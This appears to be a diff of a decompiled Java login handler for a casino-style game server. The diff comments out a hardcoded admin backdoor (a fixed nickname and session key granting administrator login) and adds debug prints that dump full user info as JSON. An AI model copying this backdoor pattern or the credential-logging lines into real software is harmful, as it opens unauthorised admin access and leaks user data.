@@ -1,6 +1,6 @@
 /*
  * Decompiled with CFR 0_116.
- * 
+ *
  * Could not load the following classes:
  *  bitzero.engine.sessions.ISession
  *  bitzero.server.core.BZEventType
@@ -31,6 +31,7 @@ import bitzero.server.extensions.data.DataCmd;
 import bitzero.util.ExtensionUtility;
 import bitzero.util.common.business.Debug;
 import bitzero.util.socialcontroller.bean.UserInfo;
+import com.google.gson.Gson;
 import com.vinplay.usercore.utils.GameCommon;
 import com.vinplay.vbee.common.hazelcast.HazelcastLoader;
 import com.vinplay.vbee.common.mongodb.MongoDBConnectionFactory;
@@ -43,54 +44,51 @@ import game.modules.player.cmd.rev.LoginCmd;
 import game.modules.tour.TourModule;
 import game.utils.GameUtils;
 import game.xocdia.conf.XocDiaConfig;
+
 import java.io.IOException;
 
 public class BaseGameExtension
-extends BZExtension {
+        extends BZExtension {
     public void init() {
-        Debug.trace((Object)"BaseGameExtension init");
+        Debug.trace((Object) "BaseGameExtension init");
         try {
             HazelcastLoader.start();
-            RMQApi.start((String)"config/rmq.properties");
-        }
-        catch (IOException e) {
-            Debug.trace((Object)e);
+            RMQApi.start((String) "config/rmq.properties");
+        } catch (IOException e) {
+            Debug.trace((Object) e);
         }
         if (GameUtils.isLog) {
             try {
                 MongoDBConnectionFactory.init();
-            }
-            catch (IOException e) {
-                Debug.trace((Object)e);
+            } catch (IOException e) {
+                Debug.trace((Object) e);
             }
         }
-        if (GameUtils.gameName.equalsIgnoreCase("XocDia") || GameUtils.gameName.equalsIgnoreCase("PokerTour") || GameUtils.gameName.equalsIgnoreCase("BauCua") ) {
+        if (GameUtils.gameName.equalsIgnoreCase("XocDia") || GameUtils.gameName.equalsIgnoreCase("PokerTour") || GameUtils.gameName.equalsIgnoreCase("BauCua")) {
             try {
                 GameCommon.init();
                 if (GameUtils.gameName.equalsIgnoreCase("XocDia") || GameUtils.gameName.equalsIgnoreCase("BauCua")) {
                     XocDiaConfig.instance();
                 }
-            }
-            catch (Exception e) {
-                Debug.trace((Object)e);
+            } catch (Exception e) {
+                Debug.trace((Object) e);
             }
         }
         try {
-            this.addRequestHandler((short)1000, PlayerModule.class);
-            Debug.trace((Object)"BaseGameExtension PlayerModule init");
-            this.addRequestHandler((short)3000, GameRoomModule.class);
-            Debug.trace((Object)"BaseGameExtension GameRoomModule init");
-         //   this.addRequestHandler((short)4000, AdminModule.class);
-            Debug.trace((Object)"BaseGameExtension AdminModule init");
+            this.addRequestHandler((short) 1000, PlayerModule.class);
+            Debug.trace((Object) "BaseGameExtension PlayerModule init");
+            this.addRequestHandler((short) 3000, GameRoomModule.class);
+            Debug.trace((Object) "BaseGameExtension GameRoomModule init");
+            //   this.addRequestHandler((short)4000, AdminModule.class);
+            Debug.trace((Object) "BaseGameExtension AdminModule init");
             if (GameUtils.gameName.equalsIgnoreCase("PokerTour")) {
-            ////    this.addRequestHandler((short)5000, TourModule.class);
-                Debug.trace((Object)"BaseGameExtension TourModule init");
+                ////    this.addRequestHandler((short)5000, TourModule.class);
+                Debug.trace((Object) "BaseGameExtension TourModule init");
             }
-            this.addEventHandler((IBZEventType)BZEventType.USER_LOGIN, LoginSuccessHandler.class);
-            Debug.trace((Object)"BaseGameExtension LoginSuccessHandler init");
-        }
-        catch (Exception e) {
-            Debug.trace((Object)e);
+            this.addEventHandler((IBZEventType) BZEventType.USER_LOGIN, LoginSuccessHandler.class);
+            Debug.trace((Object) "BaseGameExtension LoginSuccessHandler init");
+        } catch (Exception e) {
+            Debug.trace((Object) e);
         }
     }
 
@@ -98,28 +96,32 @@ extends BZExtension {
         if (s != 1 && s != 2) {
             return;
         }
-        if (s == 2) {
-            LoginCmd cmd = new LoginCmd(dataCmd);
-            if (cmd.nickname.equalsIgnoreCase("vingod") && cmd.sessionKey.equalsIgnoreCase("FIPjg5e874RzU0Po")) {
-                UserInfo info = GameUtils.getAdminInfo();
-                ExtensionUtility.instance().canLogin(info, "", iSession);
-            }
-            return;
-        }
+//        if (s == 2) {
+//            LoginCmd cmd = new LoginCmd(dataCmd);
+//            if (cmd.nickname.equalsIgnoreCase("vingod") && cmd.sessionKey.equalsIgnoreCase("FIPjg5e874RzU0Po")) {
+//                UserInfo info = GameUtils.getAdminInfo();
+//                ExtensionUtility.instance().canLogin(info, "", iSession);
+//            }
+//            return;
+//        }
         if (GameUtils.isMainTain) {
             ExtensionUtility.instance().sendLoginResponse(iSession, 3);
             return;
         }
         LoginCmd cmd = new LoginCmd(dataCmd);
-        UserInfo info = null;
-        info = GameUtils.dev_mod ? GameUtils.getUserInfoDev(cmd.nickname, cmd.sessionKey) : GameUtils.getUserInfo(cmd.nickname, cmd.sessionKey);
+        UserInfo info = GameUtils.dev_mod ? GameUtils.getUserInfoDev(cmd.nickname, cmd.sessionKey) : GameUtils.getUserInfo(cmd.nickname, cmd.sessionKey);
+        System.out.println("==============> User info " + new Gson().toJson(info));
         if (info != null) {
+            System.out.println("===> CASE 1");
             if (info.getUsername() == null || info.getUsername().length() == 0) {
+                System.out.println("===> CASE 1.1");
                 ExtensionUtility.instance().sendLoginResponse(iSession, 2);
             } else {
+                System.out.println("===> CASE 1.2");
                 User user = ExtensionUtility.instance().canLogin(info, "", iSession);
             }
         } else {
+            System.out.println("===> CASE 2");
             ExtensionUtility.instance().sendLoginResponse(iSession, 1);
         }
     }
